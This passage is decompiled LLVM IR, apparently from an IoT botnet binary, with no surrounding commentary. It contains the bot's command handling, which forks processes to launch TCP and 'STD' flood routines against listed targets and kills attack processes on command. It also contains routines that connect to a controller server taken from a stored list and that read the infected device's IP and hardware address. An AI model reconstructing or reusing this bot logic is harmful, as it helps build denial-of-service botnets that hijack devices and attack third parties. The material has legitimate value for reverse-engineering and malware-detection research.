  %v2_10006280 = call i32 @atol(i32 %v2_10006278, i32 %v1_10006274)
  br label %dec_label_pc_10006294

dec_label_pc_1000628c:                            ; preds = %dec_label_pc_1000625c
  br label %dec_label_pc_10006294

dec_label_pc_10006294:                            ; preds = %dec_label_pc_10006270, %dec_label_pc_1000628c
  %storemerge4 = phi i32 [ 0, %dec_label_pc_1000628c ], [ %v2_10006280, %dec_label_pc_10006270 ]
  store i32 %v2_100061c0, i32* @r3, align 4
  store i32 268460716, i32* @lr, align 4
  %v2_100062a8 = call i32 @__GI_strchr(i32 %v2_100061c0, i32 44)
  %v3_100062b0 = icmp eq i32 %v2_100062a8, 0
  br i1 %v3_100062b0, label %dec_label_pc_10006338, label %dec_label_pc_100062b8

dec_label_pc_100062b8:                            ; preds = %dec_label_pc_10006294
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268460748, i32* @lr, align 4
  %v4_100062c8 = call i32 @__GI_strtok(i32 %v2_100061c0, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_1000632c25 = icmp eq i32 %v4_100062c8, 0
  br i1 %v3_1000632c25, label %dec_label_pc_10006370, label %dec_label_pc_100062d8

dec_label_pc_100062d8:                            ; preds = %dec_label_pc_100062b8, %dec_label_pc_10006310
  %storemerge1326 = phi i32 [ %v4_1000631c, %dec_label_pc_10006310 ], [ %v4_100062c8, %dec_label_pc_100062b8 ]
  store i32 268460764, i32* @lr, align 4
  %v0_100062d8 = call i32 @listFork()
  %v3_100062e0 = icmp eq i32 %v0_100062d8, 0
  br i1 %v3_100062e0, label %dec_label_pc_100062e8, label %dec_label_pc_10006310

dec_label_pc_100062e8:                            ; preds = %dec_label_pc_100062d8
  %v7_10006304 = call i32 @sendTCP(i32 %storemerge1326, i32 %v2_100061d8, i32 %v2_100061f4, i32 %v2_10006210, i32 %v2_10006224, i32 %storemerge4, i32 %storemerge5)
  %v1_1000630c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006310

dec_label_pc_10006310:                            ; preds = %dec_label_pc_100062d8, %dec_label_pc_100062e8
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268460832, i32* @lr, align 4
  %v4_1000631c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_1000632c = icmp eq i32 %v4_1000631c, 0
  br i1 %v3_1000632c, label %dec_label_pc_10006370, label %dec_label_pc_100062d8

dec_label_pc_10006338:                            ; preds = %dec_label_pc_10006294
  store i32 268460860, i32* @lr, align 4
  %v0_10006338 = call i32 @listFork()
  %v3_10006340 = icmp eq i32 %v0_10006338, 0
  br i1 %v3_10006340, label %dec_label_pc_10006348, label %dec_label_pc_10006370

dec_label_pc_10006348:                            ; preds = %dec_label_pc_10006338
  %v7_10006364 = call i32 @sendTCP(i32 %v2_100061c0, i32 %v2_100061d8, i32 %v2_100061f4, i32 %v2_10006210, i32 %v2_10006224, i32 %storemerge4, i32 %storemerge5)
  %v1_1000636c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006370

dec_label_pc_10006370:                            ; preds = %dec_label_pc_10006310, %dec_label_pc_100062b8, %dec_label_pc_10006338, %dec_label_pc_10006084, %dec_label_pc_10006348
  %v2_10006374 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001217c.500 to i32), i32* @r4, align 4
  %v3_10006384 = inttoptr i32 %v2_10006374 to i8*
  %v4_10006384 = call i32 @__GI_strcoll(i8* %v3_10006384, i32 ptrtoint ([4 x i8]* @global_var_1001217c.500 to i32))
  %v3_1000638c = icmp eq i32 %v4_10006384, 0
  br i1 %v3_1000638c, label %dec_label_pc_10006394, label %dec_label_pc_100064fc

dec_label_pc_10006394:                            ; preds = %dec_label_pc_10006370
  %tmp88 = icmp slt i32 %arg1, 4
  br i1 %tmp88, label %dec_label_pc_100063e0, label %dec_label_pc_100063a0

dec_label_pc_100063a0:                            ; preds = %dec_label_pc_10006394
  %v1_100063a4 = add i32 %tmp, 8
  %v1_100063a8 = inttoptr i32 %v1_100063a4 to i32*
  %v2_100063a8 = load i32, i32* %v1_100063a8, align 4
  store i32 268460980, i32* @lr, align 4
  %v2_100063b0 = call i32 @atol(i32 %v2_100063a8, i32 %v1_100063a4)
  %tmp89 = icmp slt i32 %v2_100063b0, 1
  br i1 %tmp89, label %dec_label_pc_100063e0, label %dec_label_pc_100063c0

dec_label_pc_100063c0:                            ; preds = %dec_label_pc_100063a0
  %v1_100063c4 = add i32 %tmp, 12
  %v1_100063c8 = inttoptr i32 %v1_100063c4 to i32*
  %v2_100063c8 = load i32, i32* %v1_100063c8, align 4
  store i32 268461012, i32* @lr, align 4
  %v2_100063d0 = call i32 @atol(i32 %v2_100063c8, i32 %v1_100063c4)
  %v2_100063d8 = icmp sgt i32 %v2_100063d0, 0
  br i1 %v2_100063d8, label %dec_label_pc_10006400, label %dec_label_pc_100063e0

dec_label_pc_100063e0:                            ; preds = %dec_label_pc_100063c0, %dec_label_pc_100063a0, %dec_label_pc_10006394
  %v3_100063e4 = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_100063fc.502 to i32), i32* @lr, align 4
  %v5_100063f8 = call i32 @Rootsprintf(i32 %v3_100063e4, i32 ptrtoint ([27 x i8]* @global_var_10012180.501 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_1000662c

dec_label_pc_10006400:                            ; preds = %dec_label_pc_100063c0
  %v1_10006404 = add i32 %tmp, 4
  %v1_10006408 = inttoptr i32 %v1_10006404 to i32*
  %v2_10006408 = load i32, i32* %v1_10006408, align 4
  %v2_10006418 = load i32, i32* %v1_100063a8, align 4
  store i32 268461092, i32* @lr, align 4
  %v2_10006420 = call i32 @atol(i32 %v2_10006418, i32 %v1_100063a4)
  %v2_10006434 = load i32, i32* %v1_100063c8, align 4
  store i32 268461120, i32* @lr, align 4
  %v2_1000643c = call i32 @atol(i32 %v2_10006434, i32 %v1_100063c4)
  store i32 %v2_10006408, i32* @r3, align 4
  store i32 268461144, i32* @lr, align 4
  %v2_10006454 = call i32 @__GI_strchr(i32 %v2_10006408, i32 44)
  %v3_1000645c = icmp eq i32 %v2_10006454, 0
  br i1 %v3_1000645c, label %dec_label_pc_100064d4, label %dec_label_pc_10006464

dec_label_pc_10006464:                            ; preds = %dec_label_pc_10006400
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268461176, i32* @lr, align 4
  %v4_10006474 = call i32 @__GI_strtok(i32 %v2_10006408, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_100064c821 = icmp eq i32 %v4_10006474, 0
  br i1 %v3_100064c821, label %dec_label_pc_100064fc, label %dec_label_pc_10006484

dec_label_pc_10006484:                            ; preds = %dec_label_pc_10006464, %dec_label_pc_100064ac
  %storemerge1122 = phi i32 [ %v4_100064b8, %dec_label_pc_100064ac ], [ %v4_10006474, %dec_label_pc_10006464 ]
  store i32 268461192, i32* @lr, align 4
  %v0_10006484 = call i32 @listFork()
  %v3_1000648c = icmp eq i32 %v0_10006484, 0
  br i1 %v3_1000648c, label %dec_label_pc_10006494, label %dec_label_pc_100064ac

dec_label_pc_10006494:                            ; preds = %dec_label_pc_10006484
  %v3_100064a0 = call i32 @sendSTD(i32 %storemerge1122, i32 %v2_10006420, i32 %v2_1000643c)
  %v1_100064a8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_10006484, %dec_label_pc_10006494
  store i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32* @r4, align 4
  store i32 268461244, i32* @lr, align 4
  %v4_100064b8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_100064c8 = icmp eq i32 %v4_100064b8, 0
  br i1 %v3_100064c8, label %dec_label_pc_100064fc, label %dec_label_pc_10006484

dec_label_pc_100064d4:                            ; preds = %dec_label_pc_10006400
  store i32 268461272, i32* @lr, align 4
  %v0_100064d4 = call i32 @listFork()
  %v3_100064dc = icmp eq i32 %v0_100064d4, 0
  br i1 %v3_100064dc, label %dec_label_pc_100064e4, label %dec_label_pc_1000662c

dec_label_pc_100064e4:                            ; preds = %dec_label_pc_100064d4
  %v3_100064f0 = call i32 @sendSTD(i32 %v2_10006408, i32 %v2_10006420, i32 %v2_1000643c)
  %v1_100064f8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100064fc

dec_label_pc_100064fc:                            ; preds = %dec_label_pc_100064ac, %dec_label_pc_10006464, %dec_label_pc_10006370, %dec_label_pc_100064e4
  %v2_10006500 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001219c.506 to i32), i32* @r4, align 4
  %v3_10006510 = inttoptr i32 %v2_10006500 to i8*
  %v4_10006510 = call i32 @__GI_strcoll(i8* %v3_10006510, i32 ptrtoint ([5 x i8]* @global_var_1001219c.506 to i32))
  %v3_10006518 = icmp eq i32 %v4_10006510, 0
  br i1 %v3_10006518, label %dec_label_pc_10006520, label %dec_label_pc_1000662c

dec_label_pc_10006520:                            ; preds = %dec_label_pc_100064fc
  br label %dec_label_pc_100065c4

dec_label_pc_10006534:                            ; preds = %dec_label_pc_100065c4, %dec_label_pc_1000660c
  %v1_10006538 = mul i32 %storemerge9, 4
  %v3_10006544 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_10006548 = add i32 %v3_10006544, %v1_10006538
  %v1_1000654c = inttoptr i32 %v2_10006548 to i32*
  %v2_1000654c = load i32, i32* %v1_1000654c, align 4
  %v3_10006550 = icmp eq i32 %v2_1000654c, 0
  br i1 %v3_10006550, label %dec_label_pc_100065b8, label %dec_label_pc_10006558

dec_label_pc_10006558:                            ; preds = %dec_label_pc_10006534
  %v2_10006570 = load i32, i32* %v1_1000654c, align 4
  store i32 268461432, i32* @lr, align 4
  %v0_10006574 = call i32 @__libc_getpid()
  %v4_1000657c = icmp eq i32 %v2_10006570, %v0_10006574
  br i1 %v4_1000657c, label %dec_label_pc_100065b8, label %dec_label_pc_10006584

dec_label_pc_10006584:                            ; preds = %dec_label_pc_10006558
  %v3_10006594 = load i32, i32* @global_var_10024a54.46, align 4
  %v2_10006598 = add i32 %v3_10006594, %v1_10006538
  %v1_1000659c = inttoptr i32 %v2_10006598 to i32*
  %v2_1000659c = load i32, i32* %v1_1000659c, align 4
  store i32 268461484, i32* @lr, align 4
  %v2_100065a8 = call i32 @kill(i32 %v2_1000659c, i32 9)
  %v1_100065b0 = add i32 %stack_var_-196.1, 1
  br label %dec_label_pc_100065b8

dec_label_pc_100065b8:                            ; preds = %dec_label_pc_10006558, %dec_label_pc_10006534, %dec_label_pc_10006584
  %v0_1000665432 = phi i32 [ %v0_1000665433, %dec_label_pc_10006534 ], [ %v0_10006574, %dec_label_pc_10006558 ], [ %v2_100065a8, %dec_label_pc_10006584 ]
  %stack_var_-196.0 = phi i32 [ %stack_var_-196.1, %dec_label_pc_10006534 ], [ %stack_var_-196.1, %dec_label_pc_10006558 ], [ %v1_100065b0, %dec_label_pc_10006584 ]
  %v1_100065bc = add i32 %storemerge9, 1
  br label %dec_label_pc_100065c4

dec_label_pc_100065c4:                            ; preds = %dec_label_pc_10006520, %dec_label_pc_100065b8
  %v0_1000665433 = phi i32 [ 0, %dec_label_pc_10006520 ], [ %v0_1000665432, %dec_label_pc_100065b8 ]
  %stack_var_-196.1 = phi i32 [ 0, %dec_label_pc_10006520 ], [ %stack_var_-196.0, %dec_label_pc_100065b8 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_10006520 ], [ %v1_100065bc, %dec_label_pc_100065b8 ]
  %v2_100065ec = load i32, i32* @global_var_10024a28.44, align 4
  %v3_10006604 = icmp eq i32 %v2_100065ec, 0
  br i1 %v3_10006604, label %dec_label_pc_1000660c, label %dec_label_pc_10006534

dec_label_pc_1000660c:                            ; preds = %dec_label_pc_100065c4
  %v3_100065f0 = load i32, i32* @global_var_10024a2c.45, align 4
  %v3_10006624 = icmp ugt i32 %v3_100065f0, %storemerge9
  br i1 %v3_10006624, label %dec_label_pc_10006534, label %dec_label_pc_1000662c

dec_label_pc_1000662c:                            ; preds = %dec_label_pc_10006020, %dec_label_pc_1000660c, %dec_label_pc_10005fc4, %dec_label_pc_10005bb4, %dec_label_pc_100064d4, %dec_label_pc_100064fc, %dec_label_pc_10006048, %dec_label_pc_10005bd8, %dec_label_pc_10005af8, %dec_label_pc_10005b94, %dec_label_pc_10005b88, %dec_label_pc_10005a84, %dec_label_pc_100063e0, %dec_label_pc_10006198, %dec_label_pc_10005e54, %dec_label_pc_10005b30, %dec_label_pc_10005a18
  %v0_10006654 = phi i32 [ %v2_10005bc4, %dec_label_pc_10005bb4 ], [ %v0_100064d4, %dec_label_pc_100064d4 ], [ %v4_10006510, %dec_label_pc_100064fc ], [ %v0_10006048, %dec_label_pc_10006048 ], [ %v0_10005bd8, %dec_label_pc_10005bd8 ], [ 0, %dec_label_pc_10005af8 ], [ %v2_10005ba4, %dec_label_pc_10005b94 ], [ 0, %dec_label_pc_10005b88 ], [ 0, %dec_label_pc_10005a84 ], [ %v5_100063f8, %dec_label_pc_100063e0 ], [ %v5_100061b0, %dec_label_pc_10006198 ], [ %v5_10005e6c, %dec_label_pc_10005e54 ], [ %v0_10005b08, %dec_label_pc_10005b30 ], [ %v5_10005a30, %dec_label_pc_10005a18 ], [ 0, %dec_label_pc_10005fc4 ], [ %v0_1000665433, %dec_label_pc_1000660c ], [ 0, %dec_label_pc_10006020 ]
  ret i32 %v0_10006654

; uselistorder directives
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %stack_var_-196.1, { 0, 2, 1 }
  uselistorder i32 %v1_10006538, { 1, 0 }
  uselistorder i32 %v4_100064b8, { 1, 0 }
  uselistorder i32 %v2_1000643c, { 1, 0 }
  uselistorder i32 %v2_10006420, { 1, 0 }
  uselistorder i32 %v2_10006408, { 1, 0, 3, 2 }
  uselistorder i32 %v4_1000631c, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_10006224, { 1, 0 }
  uselistorder i32 %v2_10006210, { 1, 0 }
  uselistorder i32 %v2_100061f4, { 1, 0 }
  uselistorder i32 %v2_100061d8, { 1, 0 }
  uselistorder i32 %v2_100061c0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_1000602c, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge816, { 1, 0 }
  uselistorder i32 %v2_10005f10, { 1, 0 }
  uselistorder i32 %v2_10005ee8, { 1, 0 }
  uselistorder i32 %v2_10005ecc, { 1, 0 }
  uselistorder i32 %v2_10005eb0, { 1, 0 }
  uselistorder i32 %v2_10005e94, { 1, 0 }
  uselistorder i32 %v2_10005e7c, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 5, 6, 7, 4, 8, 9, 10, 11, 3, 12, 13, 14, 2, 1, 0, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10011fc0.469 to i32), { 1, 8, 2, 9, 0, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10011c58.28 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000662c, { 1, 5, 4, 12, 13, 6, 0, 2, 14, 7, 3, 9, 10, 15, 8, 11, 16 }
  uselistorder label %dec_label_pc_100065c4, { 1, 0 }
  uselistorder label %dec_label_pc_100065b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006534, { 1, 0 }
  uselistorder label %dec_label_pc_100064fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100064ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006484, { 1, 0 }
  uselistorder label %dec_label_pc_10006370, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10006310, { 1, 0 }
  uselistorder label %dec_label_pc_100062d8, { 1, 0 }
  uselistorder label %dec_label_pc_10006294, { 1, 0 }
  uselistorder label %dec_label_pc_1000625c, { 1, 0 }
  uselistorder label %dec_label_pc_100061b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006084, { 1, 0 }
  uselistorder label %dec_label_pc_10006020, { 1, 0 }
  uselistorder label %dec_label_pc_10005fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10005fa0, { 1, 0 }
  uselistorder label %dec_label_pc_10005f68, { 1, 0 }
  uselistorder label %dec_label_pc_10005f54, { 1, 0 }
  uselistorder label %dec_label_pc_10005e74, { 1, 0 }
  uselistorder label %dec_label_pc_10005cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10005b64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005ad0, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_1000666c = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268461700, i32* @lr, align 4
  %v3_10006680 = call i32 @__GI_memset(i32 %v2_1000666c, i32 0, i32 4096)
  %v3_10006688 = load i32, i32* @global_var_10024a20.27, align 4
  %v3_1000668c = icmp eq i32 %v3_10006688, 0
  br i1 %v3_1000668c, label %dec_label_pc_100066b0, label %dec_label_pc_10006694

dec_label_pc_10006694:                            ; preds = %entry
  store i32 268461732, i32* @lr, align 4
  %v1_100066a0 = call i32 @__libc_close(i32 %v3_10006688)
  store i32 0, i32* @global_var_10024a20.27, align 4
  br label %dec_label_pc_100066b0

dec_label_pc_100066b0:                            ; preds = %entry, %dec_label_pc_10006694
  %v3_100066b4 = load i32, i32* @global_var_100249e0.507, align 4
  %v3_100066b8 = icmp eq i32 %v3_100066b4, 0
  br i1 %v3_100066b8, label %dec_label_pc_100066c0, label %dec_label_pc_100066d0

dec_label_pc_100066c0:                            ; preds = %dec_label_pc_100066b0
  br label %dec_label_pc_100066e4

dec_label_pc_100066d0:                            ; preds = %dec_label_pc_100066b0
  %v1_100066d8 = add i32 %v3_100066b4, 1
  br label %dec_label_pc_100066e4

dec_label_pc_100066e4:                            ; preds = %dec_label_pc_100066c0, %dec_label_pc_100066d0
  %storemerge = phi i32 [ 0, %dec_label_pc_100066c0 ], [ %v1_100066d8, %dec_label_pc_100066d0 ]
  store i32 %storemerge, i32* @global_var_100249e0.507, align 4
  %v1_100066f8 = mul i32 %storemerge, 4
  %v2_100066fc = add i32 %v1_100066f8, ptrtoint ([20 x i8]** @global_var_100249d8.509 to i32)
  %v1_10006700 = inttoptr i32 %v2_100066fc to i32*
  %v2_10006700 = load i32, i32* %v1_10006700, align 4
  %v2_1000670c = inttoptr i32 %v2_10006700 to i8*
  %v3_1000670c = call i32 @strcpy(i32 %v2_1000666c, i8* %v2_1000670c)
  store i32 %v2_1000666c, i32* @r3, align 4
  store i32 268461864, i32* @lr, align 4
  %v2_10006724 = call i32 @__GI_strchr(i32 %v2_1000666c, i32 58)
  %v3_1000672c = icmp eq i32 %v2_10006724, 0
  br i1 %v3_1000672c, label %dec_label_pc_1000677c, label %dec_label_pc_10006734

dec_label_pc_10006734:                            ; preds = %dec_label_pc_100066e4
  store i32 %v2_1000666c, i32* @r3, align 4
  store i32 268461892, i32* @lr, align 4
  %v2_10006740 = call i32 @__GI_strchr(i32 %v2_1000666c, i32 58)
  %v1_10006748 = add i32 %v2_10006740, 1
  store i32 268461908, i32* @lr, align 4
  %v2_10006750 = call i32 @atol(i32 %v1_10006748, i32 %v2_10006740)
  store i32 %v2_1000666c, i32* @r3, align 4
  store i32 268461932, i32* @lr, align 4
  %v2_10006768 = call i32 @__GI_strchr(i32 %v2_1000666c, i32 58)
  %v3_10006778 = inttoptr i32 %v2_10006768 to i8*
  store i8 0, i8* %v3_10006778, align 1
  br label %dec_label_pc_1000677c

dec_label_pc_1000677c:                            ; preds = %dec_label_pc_100066e4, %dec_label_pc_10006734
  %stack_var_-4136.0 = phi i32 [ 123, %dec_label_pc_100066e4 ], [ %v2_10006750, %dec_label_pc_10006734 ]
  store i32 268461964, i32* @lr, align 4
  %v3_10006788 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10006788, i32* @global_var_10024a20.27, align 4
  store i32 268462008, i32* @lr, align 4
  %v5_100067b4 = call i32 @connectTimeout(i32 %v3_10006788, i32 %v2_1000666c, i32 %stack_var_-4136.0, i32 30, i32 %v2_1000666c)
  %v3_100067bc = icmp eq i32 %v5_100067b4, 0
  %. = zext i1 %v3_100067bc to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000666c, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000677c, { 1, 0 }
  uselistorder label %dec_label_pc_100066e4, { 1, 0 }
  uselistorder label %dec_label_pc_100066b0, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268462108, i32* @lr, align 4
  %v3_10006818 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_1000682c = icmp eq i32 %v3_10006818, -1
  br i1 %v4_1000682c, label %dec_label_pc_10006834, label %dec_label_pc_10006840

dec_label_pc_10006834:                            ; preds = %entry
  br label %dec_label_pc_10006a6c

dec_label_pc_10006840:                            ; preds = %entry
  %v2_10006840 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268462200, i32* @lr, align 4
  %v2_10006874 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_100121a4.511 to i32))
  store i32 53, i32* @r3, align 4
  %v1_10006884 = call i32 @htons(i32 53)
  store i32 268462244, i32* @lr, align 4
  %v3_100068a0 = call i32 @__libc_connect(i32 %v3_10006818, i32 %v2_10006840, i32 16)
  %v4_100068b4 = icmp eq i32 %v3_100068a0, -1
  br i1 %v4_100068b4, label %dec_label_pc_100068bc, label %dec_label_pc_100068c8

dec_label_pc_100068bc:                            ; preds = %dec_label_pc_10006840
  br label %dec_label_pc_10006a6c

dec_label_pc_100068c8:                            ; preds = %dec_label_pc_10006840
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_100068d0 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_100068d4 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268462312, i32* @lr, align 4
  %v4_100068e4 = call i32 @__GI_getsockname(i32 %v3_10006818, i32 %v2_100068d0, i32 %v2_100068d4, i32 %v2_100068d4)
  %v4_100068f8 = icmp eq i32 %v4_100068e4, -1
  br i1 %v4_100068f8, label %dec_label_pc_10006900, label %dec_label_pc_1000690c

dec_label_pc_10006900:                            ; preds = %dec_label_pc_100068c8
  br label %dec_label_pc_10006a6c

dec_label_pc_1000690c:                            ; preds = %dec_label_pc_100068c8
  store i32 268462380, i32* @lr, align 4
  %v3_10006928 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_100121ac.512 to i32), i32 0)
  %v2_100069ac = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_100069ac

dec_label_pc_10006938:                            ; preds = %dec_label_pc_100069ac
  store i32 268462412, i32* @lr, align 4
  %v6_10006948 = call i32 @strstr(i32 %v2_100069ac, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100121bc.513, i32 0, i32 0), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_10006950 = icmp eq i32 %v6_10006948, 0
  br i1 %v3_10006950, label %dec_label_pc_10006994, label %dec_label_pc_10006970.preheader

dec_label_pc_10006970.preheader:                  ; preds = %dec_label_pc_10006938
  %v2_1000697410 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000697c14 = icmp eq i8 %v2_1000697410, 9
  br i1 %v3_1000697c14, label %dec_label_pc_10006984, label %dec_label_pc_10006964

dec_label_pc_10006964:                            ; preds = %dec_label_pc_10006970.preheader, %dec_label_pc_10006964
  %v4_1000697015 = phi i32 [ %v1_10006968, %dec_label_pc_10006964 ], [ %v2_100069ac, %dec_label_pc_10006970.preheader ]
  %v1_10006968 = add i32 %v4_1000697015, 1
  %v5_1000696c = inttoptr i32 %v1_10006968 to i8*
  %v2_10006974 = load i8, i8* %v5_1000696c, align 1
  %v3_1000697c = icmp eq i8 %v2_10006974, 9
  br i1 %v3_1000697c, label %dec_label_pc_10006984, label %dec_label_pc_10006964

dec_label_pc_10006984:                            ; preds = %dec_label_pc_10006964, %dec_label_pc_10006970.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_10006970.preheader ], [ %v5_1000696c, %dec_label_pc_10006964 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_100069cc

dec_label_pc_10006994:                            ; preds = %dec_label_pc_10006938
  store i32 268462508, i32* @lr, align 4
  %v3_100069a8 = call i32 @__GI_memset(i32 %v2_100069ac, i32 0, i32 4096)
  br label %dec_label_pc_100069ac

dec_label_pc_100069ac:                            ; preds = %dec_label_pc_1000690c, %dec_label_pc_10006994
  %v3_100069bc = call i32 @fdgets(i32 %v2_100069ac, i32 4096, i32 %v3_10006928)
  %v3_100069c4 = icmp eq i32 %v3_100069bc, 0
  br i1 %v3_100069c4, label %dec_label_pc_100069cc, label %dec_label_pc_10006938

dec_label_pc_100069cc:                            ; preds = %dec_label_pc_100069ac, %dec_label_pc_10006984
  store i32 268462548, i32* @lr, align 4
  %v1_100069d0 = call i32 @__libc_close(i32 %v3_10006928)
  %v3_100069d4 = load i8, i8* %stack_var_-4160, align 1
  %v3_100069dc = icmp eq i8 %v3_100069d4, 0
  br i1 %v3_100069dc, label %dec_label_pc_10006a60, label %dec_label_pc_100069e4

dec_label_pc_100069e4:                            ; preds = %dec_label_pc_100069cc
  %v2_100069e4 = ptrtoint i32* %stack_var_-64 to i32
  %v3_100069f4 = call i32 @strcpy(i32 %v2_100069e4, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_10006a14.514 to i32), i32* @lr, align 4
  %v3_10006a10 = call i32 @ioctl(i32 %v3_10006818, i32 35111, i32 %v2_100069e4)
  %v2_10006a28 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_10006a20

dec_label_pc_10006a20:                            ; preds = %dec_label_pc_100069e4, %dec_label_pc_10006a20
  %storemerge58 = phi i32 [ 0, %dec_label_pc_100069e4 ], [ %v1_10006a4c, %dec_label_pc_10006a20 ]
  %v2_10006a30 = add i32 %storemerge58, %v2_10006a28
  %v1_10006a34 = inttoptr i32 %v2_10006a30 to i8*
  %v2_10006a34 = load i8, i8* %v1_10006a34, align 1
  %v4_10006a44 = add i32 %storemerge58, ptrtoint (i32* @global_var_10024a30.515 to i32)
  %v5_10006a44 = inttoptr i32 %v4_10006a44 to i8*
  store i8 %v2_10006a34, i8* %v5_10006a44, align 1
  %v1_10006a4c = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_10006a4c, 6
  br i1 %tmp37, label %dec_label_pc_10006a20, label %dec_label_pc_10006a60

dec_label_pc_10006a60:                            ; preds = %dec_label_pc_10006a20, %dec_label_pc_100069cc
  store i32 ptrtoint (i32* @global_var_10006a68.516 to i32), i32* @lr, align 4
  %v1_10006a64 = call i32 @__libc_close(i32 %v3_10006818)
  br label %dec_label_pc_10006a74

dec_label_pc_10006a6c:                            ; preds = %dec_label_pc_10006900, %dec_label_pc_100068bc, %dec_label_pc_10006834
  br label %dec_label_pc_10006a74

dec_label_pc_10006a74:                            ; preds = %dec_label_pc_10006a60, %dec_label_pc_10006a6c
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_10006a6c ], [ %tmp, %dec_label_pc_10006a60 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_10006968, { 1, 0 }
  uselistorder i32 %v2_100069ac, { 3, 1, 0, 2 }
  uselistorder i32 %v3_10006818, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006a74, { 1, 0 }
  uselistorder label %dec_label_pc_10006a20, { 1, 0 }
